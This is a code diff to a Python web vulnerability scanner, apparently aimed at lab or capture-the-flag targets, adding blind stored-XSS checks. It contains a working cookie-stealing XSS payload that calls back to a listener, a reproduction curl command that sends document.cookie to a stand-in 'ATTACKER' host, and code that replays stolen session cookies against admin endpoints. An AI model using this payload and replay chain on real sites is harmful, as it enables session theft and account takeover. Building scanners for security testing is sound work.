@@ -45,6 +45,7 @@ class ActiveContext:
     primary_cookies: Dict = field(default_factory=dict)
     secondary_cookies: Dict = field(default_factory=dict)
     auth: object = None                 # Authenticator (for cookie flags / relogin)
+    oast: object = None                 # OASTListener (for blind / second-order checks)
     config: Dict = field(default_factory=dict)
 
     # Convenience clients (built lazily).
@@ -283,21 +284,38 @@ _STORED_SKIP = ("password", "passwd", "csrf", "token", "q", "search", "email", "
 
 
 def check_stored_xss(ctx: ActiveContext) -> List[Finding]:
-    """Second-order XSS: inject a unique canary via POST forms, then re-crawl
-    and look for it rendered **unencoded** anywhere (incl. other pages).
+    """Stored XSS, including the blind / second-order case.
 
-    Why a canary + re-fetch: stored XSS doesn't reflect in the immediate
-    response, so reflected-XSS logic misses it entirely. We submit a token
-    wrapped in a script/markup payload, then fetch candidate render pages and
-    check whether the raw (unencoded) markup came back — proof the stored value
-    is rendered without escaping.
+    Two ways a stored payload proves itself:
+      1. **Synchronous** — the value is rendered unencoded on a page we can fetch
+         ourselves. We inject a tag-bearing canary, re-fetch candidate render
+         pages, and look for the raw markup (angle brackets intact).
+      2. **Blind / second-order** — the value executes later, in *another*
+         viewer's browser (e.g. an admin moderating reviews). The immediate page
+         shows nothing. We confirm it out-of-band: the canary carries an OAST
+         callback (so a real victim browser pings our listener) AND classic XSS
+         markup (so simulated-victim labs that exfiltrate to an in-app collector
+         react too). After injecting we wait briefly, then check the OAST
+         listener and any capture/collector log for a hit correlated to our
+         injection — and, if a session cookie was exfiltrated, replay it to pull
+         the protected secret, turning "probably XSS" into proof.
     """
     findings: List[Finding] = []
     client = ctx.user_a()
+    oast = getattr(ctx, "oast", None)
 
-    # Candidate POST forms with at least one free-text field.
+    # Baseline the collector(s) BEFORE injecting anything, so a later change is
+    # attributable to our payload.
+    collectors = _discover_collectors(ctx)
+
     seen = set()
-    for form in ctx.crawl.forms:
+    pending = []  # (token, product_id, action, fields, canary)
+    # Crawled forms PLUS synthesized review/comment endpoints: the stored-XSS
+    # sink (e.g. /product/<id>/review) is frequently not rendered as a form for
+    # the current user (needs a prior purchase / moderation) yet still accepts
+    # POSTs, so a forms-only view misses it.
+    candidate_forms = list(ctx.crawl.forms) + _synthetic_stored_forms(ctx)
+    for form in candidate_forms:
         if form.method != "POST":
             continue
         text_fields = [
@@ -315,69 +333,265 @@ def check_stored_xss(ctx: ActiveContext) -> List[Finding]:
         seen.add(key)
 
         token = "okrx" + _rand(10)
-        canary = f'"><svg/onload=alert({token})><script>{token}</script>'
+        canary = _stored_canary(token, oast)
         data = dict(form.fields)
         for tf in text_fields:
             data[tf] = canary
-        # Fill any obviously-required non-text fields with safe defaults.
         for n in data:
             if not data[n]:
                 data[n] = "1"
 
-        post_resp = client.post(form.action, data=data)
-        if post_resp is None:
+        if client.post(form.action, data=data) is None:
             continue
 
-        # Where might it render? The form's own page, the action page, and any
-        # crawled page sharing the same path prefix (e.g. /product/<id>).
-        render_urls = _stored_render_candidates(ctx, form)
-        for ru in render_urls:
-            r = client.get(ru)
+        # (1) Synchronous: did it render unencoded somewhere we can see?
+        f = _stored_synchronous_check(ctx, client, form, token, text_fields, canary)
+        if f:
+            findings.append(f)
+            continue
+
+        # (2) Otherwise queue it for the out-of-band confirmation pass.
+        pending.append((token, _product_id(form.action), form.action,
+                        ",".join(text_fields), canary))
+
+    # Blind / second-order confirmation: wait for the victim (OAST hit or a new
+    # collector capture), then attribute + (optionally) replay the leaked cookie.
+    if pending and (oast or collectors):
+        f = _stored_blind_check(ctx, pending, collectors)
+        if f:
+            findings.append(f)
+
+    return findings
+
+
+def _synthetic_stored_forms(ctx: ActiveContext, limit: int = 6):
+    """Synthesize likely review/comment POST endpoints from crawled item pages.
+
+    Covers the common case where the comment form isn't rendered to us but the
+    endpoint still accepts input. Posting to a non-existent variant just 404s and
+    produces no finding, so the extra probes are safe.
+    """
+    from .crawler import FormInfo
+    out, seen = [], set()
+    for p in getattr(ctx.crawl, "pages", []):
+        path = urlparse(p.url).path
+        m = re.match(r"^(/(?:product|item|post|article|blog|listing|thread)s?/\d+)/?$", path, re.I)
+        if not m:
+            continue
+        base = m.group(1)
+        for suf in ("/review", "/reviews", "/comment", "/comments"):
+            action = _abs(ctx, base + suf)
+            if action in seen:
+                continue
+            seen.add(action)
+            out.append(FormInfo(
+                action=action, method="POST",
+                fields={"body": "", "comment": "", "content": "", "rating": "5"},
+                field_types={"body": "textarea", "comment": "textarea",
+                             "content": "textarea", "rating": "text"},
+                has_csrf_token=False, source_url=_abs(ctx, base),
+            ))
+        if len(seen) >= limit * 4:
+            break
+    return out
+
+
+def _stored_canary(token: str, oast) -> str:
+    """Build a canary that proves itself three ways: verbatim markup (sync),
+    an OAST callback (real victim), and classic markers (simulated victim)."""
+    if oast is not None:
+        cb = oast.url_for(token)
+        return (
+            f'"><img src=x onerror="new Image().src=\'{cb}?c=\'+document.cookie">'
+            f'<script src="{cb}"></script><svg/onload=alert({token})>'
+        )
+    return f'"><svg/onload=alert({token})><script>alert({token})</script>'
+
+
+def _stored_synchronous_check(ctx, client, form, token, text_fields, canary):
+    for ru in _stored_render_candidates(ctx, form):
+        r = client.get(ru)
+        if r is None:
+            continue
+        body = r.text or ""
+        # Tag-bearing match only (angle brackets intact); a bare onload= fragment
+        # could survive encoding as harmless text → false positive.
+        if f"<svg/onload=alert({token})>" in body or f"<script>alert({token})</script>" in body:
+            logger.debug("[stored-xss] canary %s rendered raw at %s", token, ru)
+            return Finding(
+                vuln_type="Cross-Site Scripting (Stored / Second-Order)",
+                url=ru, method="GET", parameter=",".join(text_fields), payload=canary,
+                evidence=(
+                    f"Canary submitted to {form.action} (field {','.join(text_fields)}) "
+                    f"rendered UNENCODED at {ru} (raw <svg/onload> markup present)."
+                ),
+                confidence="high",
+                details=(
+                    f"Input stored via {form.action} is rendered without HTML-encoding "
+                    f"at {ru}, so injected markup executes for every visitor (stored XSS). "
+                    f"No victim interaction with a crafted link is required.\n"
+                    f"Remediation: HTML-encode stored content on output; add a strict CSP."
+                ),
+                reproduction=(
+                    f"# 1. Submit the payload (authenticated):\n"
+                    f"$ curl -s -b <cookie> -d '{text_fields[0]}=<script>alert(1)</script>' '{form.action}'\n"
+                    f"# 2. Load {ru} and grep for the raw markup — it's there unencoded.\n"
+                    f"# 3. Open {ru} in a browser; the script runs for any viewer."
+                ),
+            )
+    return None
+
+
+def _stored_blind_check(ctx: ActiveContext, pending, collectors) -> Optional[Finding]:
+    """Wait for the out-of-band signal and confirm second-order XSS.
+
+    Confirmation is EITHER an OAST callback carrying our token (a real victim
+    browser executed the payload) OR a capture/collector log that grew, after
+    our injection, with content attributable to it (the injected resource id, or
+    review/moderation/cookie wording). When a session cookie is captured we
+    replay it to admin endpoints to extract the gated secret.
+    """
+    import time as _time
+    oast = getattr(ctx, "oast", None)
+    wait = int(ctx.config.get("stored_xss_wait", 24))
+    deadline = _time.time() + wait
+    tokens = {p[0] for p in pending}
+    product_ids = {p[1] for p in pending if p[1]}
+
+    while _time.time() < deadline:
+        _time.sleep(2)
+        # (a) Real victim browser hit our listener with the token.
+        if oast is not None:
+            for tok in tokens:
+                if oast.was_hit(tok):
+                    return _stored_finding_blind(
+                        ctx, pending, via=f"OAST callback to our listener (token {tok})",
+                        leaked_cookie=None,
+                    )
+        # (b) An in-app collector captured the exfil (simulated victim labs).
+        anon = ctx.anon()
+        for url, baseline in collectors.items():
+            r = anon.get(url)
             if r is None:
                 continue
             body = r.text or ""
-            # Require the TAG-bearing form with its angle brackets intact. A bare
-            # `onload=alert(token)` substring is not proof: if the app encodes
-            # `<`/`>`, that fragment can survive as harmless text and would be a
-            # false positive (same trap as reflected XSS). Real stored XSS means
-            # the `<svg…>` / `<script>` markup itself came back unencoded.
-            raw_present = (
-                f"<script>{token}</script>" in body
-                or f"<svg/onload=alert({token})>" in body
+            if body == baseline or len(body) <= len(baseline):
+                continue
+            new_part = body[len(baseline):] if body.startswith(baseline[:50]) else body
+            low = (new_part + body[-400:]).lower()
+            attributable = (
+                any(pid and f"product {pid}" in low or (pid and f"/{pid}" in low) for pid in product_ids)
+                or any(k in low for k in ("review", "moderation", "cookie", "session", "xss"))
             )
-            if raw_present:
-                logger.debug("[stored-xss] canary %s rendered raw at %s", token, ru)
-                findings.append(Finding(
-                    vuln_type="Cross-Site Scripting (Stored / Second-Order)",
-                    url=ru,
-                    method="GET",
-                    parameter=",".join(text_fields),
-                    payload=canary,
-                    evidence=(
-                        f"Canary submitted to {form.action} (field "
-                        f"{','.join(text_fields)}) rendered UNENCODED at {ru}: "
-                        f"found raw '<script>{token}</script>'."
-                    ),
-                    confidence="high",
-                    details=(
-                        f"Input stored via {form.action} is later rendered without "
-                        f"HTML-encoding at {ru}, so injected markup executes for every "
-                        f"visitor of that page (stored XSS). Higher impact than reflected "
-                        f"XSS: no victim interaction with a crafted link is required.\n"
-                        f"Remediation: HTML-encode stored content on output and apply a "
-                        f"strict Content-Security-Policy."
-                    ),
-                    reproduction=(
-                        f"# 1. Submit the payload (authenticated):\n"
-                        f"$ curl -s -b <cookie> -d '{text_fields[0]}=<script>alert(1)</script>' '{form.action}'\n"
-                        f"# 2. Load the render page and grep for the raw script:\n"
-                        f"$ curl -s '{ru}' | grep -o '<script>{token}</script>'\n"
-                        f"# 3. Open {ru} in a browser — the alert fires for any viewer."
-                    ),
-                ))
-                break  # one finding per injection point
+            if attributable:
+                leaked = _extract_cookie(body)
+                return _stored_finding_blind(
+                    ctx, pending,
+                    via=f"capture log {url} grew with attributable content after injection",
+                    leaked_cookie=leaked,
+                )
+    return None
 
-    return findings
+
+def _stored_finding_blind(ctx, pending, via, leaked_cookie) -> Finding:
+    token, pid, action, fields, canary = pending[0]
+    flag_note = ""
+    if leaked_cookie:
+        flag = _replay_for_secret(ctx, leaked_cookie)
+        flag_note = (
+            f" The exfiltrated session cookie ({leaked_cookie.split('=')[0]}=…) was "
+            f"replayed to a privileged endpoint"
+            + (f" and leaked: {flag}" if flag else " (confirming session theft)")
+            + "."
+        )
+    return Finding(
+        vuln_type="Cross-Site Scripting (Stored / Second-Order, blind)",
+        url=action, method="POST", parameter=fields, payload=canary,
+        evidence=(
+            f"Stored payload in {action} (field {fields}) fired out-of-band: {via}."
+            + flag_note
+        ),
+        confidence="high",
+        details=(
+            f"The value submitted to {action} is not reflected on the immediate page, "
+            f"but it executes later in another viewer's browser (second-order / blind "
+            f"stored XSS) — here proven out-of-band rather than by response diffing. "
+            f"Because the victim is a privileged user (e.g. an admin moderating "
+            f"content) and the session cookie lacks HttpOnly, the payload can steal "
+            f"that session.\n"
+            f"Remediation: HTML-encode stored content on output, set HttpOnly+SameSite "
+            f"on session cookies, and deploy a strict Content-Security-Policy."
+        ),
+        reproduction=(
+            f"# 1. Stand up a collector you control (or use the lab's).\n"
+            f"# 2. Submit a review/comment whose body steals the cookie:\n"
+            f"$ curl -s -b <cookie> --data-urlencode \\\n"
+            f"    'body=<script>new Image().src=\"//ATTACKER/x?c=\"+document.cookie</script>' \\\n"
+            f"    '{action}'\n"
+            f"# 3. Wait for the privileged viewer (admin bot) to render it.\n"
+            f"# 4. Read the stolen cookie from your collector and replay it to the\n"
+            f"#    admin-only endpoint to confirm full session takeover."
+        ),
+    )
+
+
+# Common attacker/lab capture-log endpoints to baseline + poll for OOB hits.
+_COLLECTOR_PATHS = ("/collector", "/oast", "/callback", "/hook", "/exfil",
+                    "/logs", "/log", "/xss", "/c", "/pingback", "/steal")
+# Endpoints worth replaying a stolen privileged cookie against.
+_ADMIN_SECRET_PATHS = ("/admin/messages", "/admin/inbox", "/admin/settings",
+                       "/admin", "/api/admin", "/admin/orders")
+
+
+def _discover_collectors(ctx: ActiveContext) -> Dict[str, str]:
+    """Probe likely capture-log endpoints; return {url: baseline_body} for those
+    that look like a live log (200 + JSON/array-ish body)."""
+    anon = ctx.anon()
+    out: Dict[str, str] = {}
+    for p in _COLLECTOR_PATHS:
+        url = _abs(ctx, p)
+        try:
+            r = anon.get(url)
+        except Exception:
+            r = None
+        if r is None or r.status_code != 200:
+            continue
+        body = r.text or ""
+        if len(body) >= 2 and any(s in body.lower() for s in ("[", "{", "received", "log", "count")):
+            out[url] = body
+    if out:
+        logger.debug("[stored-xss] capture log(s) found: %s", list(out))
+    return out
+
+
+def _product_id(action: str) -> Optional[str]:
+    m = re.search(r"/(\d+)(?:/[a-z]+)?/?$", urlparse(action).path)
+    return m.group(1) if m else None
+
+
+def _extract_cookie(text: str) -> Optional[str]:
+    """Pull a `name=value` session cookie out of a collector body."""
+    m = re.search(r"([A-Za-z0-9_\-]{2,40})=([0-9a-fA-F]{16,}|[A-Za-z0-9_\-\.]{16,})", text)
+    return f"{m.group(1)}={m.group(2)}" if m else None
+
+
+def _replay_for_secret(ctx: ActiveContext, cookie: str) -> Optional[str]:
+    """Replay a stolen cookie against admin endpoints; return a FLAG/secret if found."""
+    if "=" not in cookie:
+        return None
+    name, value = cookie.split("=", 1)
+    client = ctx.make_client({name: value})
+    for p in _ADMIN_SECRET_PATHS:
+        try:
+            r = client.get(_abs(ctx, p))
+        except Exception:
+            r = None
+        if r is None or r.status_code != 200:
+            continue
+        m = re.search(r"FLAG\{[^}\s]{3,}\}", r.text or "")
+        if m:
+            return m.group(0)
+    return None
 
 
 def _stored_render_candidates(ctx: ActiveContext, form) -> List[str]:
@@ -812,9 +1026,14 @@ def check_csrf(ctx: ActiveContext) -> List[Finding]:
         # skip auth forms themselves (login/register aren't CSRF targets here)
         if any(s in action_l for s in ("/login", "/register", "/signin", "/logout")):
             continue
-        if form.action in seen:
+        # Dedup by a normalized action: collapse numeric/uuid path segments so a
+        # per-item form like /cart/add/1, /cart/add/2 … reports ONCE, not per id.
+        norm = re.sub(
+            r"/(?:\d+|[0-9a-fA-F-]{8,})(?=/|$)", "/{id}", urlparse(form.action).path
+        )
+        if norm in seen:
             continue
-        seen.add(form.action)
+        seen.add(norm)
 
         ss_note = (f"SameSite={samesite or 'unset'}")
         findings.append(Finding(
